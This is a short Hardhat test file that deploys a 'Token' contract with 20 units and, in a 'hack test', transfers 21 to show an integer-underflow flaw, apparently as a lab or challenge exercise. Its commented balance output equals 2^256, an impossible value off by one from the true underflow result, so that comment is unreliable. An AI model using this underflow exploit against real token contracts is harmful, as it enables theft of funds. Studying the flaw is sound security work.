const { expect } = require("chai");
const { ethers } = require("hardhat");
const { MaxUint256 } = require("@ethersproject/constants");
const { BigNumber } = require("ethers");
function expandTo18Decimals(value) {
    return BigNumber.from(value).mul(BigNumber.from(10).pow(18));
}
describe("test", function () {
    var Token;
    it("init params", async function () {
        [deployer, ...users] = await ethers.getSigners();
    });
    it("deploy", async function () {
        const TokenInstance = await ethers.getContractFactory("Token");

        Token = await TokenInstance.deploy(expandTo18Decimals(20));
    });
    it("hack test", async function () {
        await Token.transfer(users[0].address, expandTo18Decimals(21));
        console.log(await Token.balanceOf(deployer.address)); //115792089237316195423570985008687907853269984665640564039456584007913129639936
    });
});
